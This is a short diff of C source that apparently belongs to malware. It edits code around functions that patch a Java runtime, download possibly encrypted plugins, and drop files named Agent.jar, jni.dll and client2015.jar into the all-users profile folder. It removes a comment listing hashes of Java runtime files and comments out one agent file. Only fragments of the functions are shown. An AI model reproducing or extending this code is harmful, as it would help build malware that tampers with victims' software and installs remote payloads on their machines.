@@ -248,17 +248,6 @@ static bool Patch( const char* userName, const char* tmpRtPath, const char* rtAd
 	return true;
 }
 
-/*
-rt_add.jar=2607978363
-rt.ini=3499486576
-6_jar.exe=4039271118
-6_jli.dll=3139858861
-6_msvcr71.dll=987786152
-7_jar.exe=2819675814
-7_jli.dll=2283789432
-7_msvcr100.dll=3273002548
-*/
-
 static char* DownloadPlugin( char *url, DWORD *dwLen, bool crypt )
 {
 	PCHAR data = 0;
@@ -443,7 +432,7 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 	//загрузка в папку ALLUSERSPROFILE
 	GetAllUsersProfile( Path, sizeof(Path) );
 
-	const char* miscFiles[] = { "Agent.jar", "AgentPassive.jar", "jni.dll", "client2015.jar", 0 };
+	const char* miscFiles[] = { "Agent.jar", /*"AgentPassive.jar",*/ "jni.dll", "client2015.jar", 0 };
 	const char** ss = miscFiles;
 	while( *ss ) 
 	{
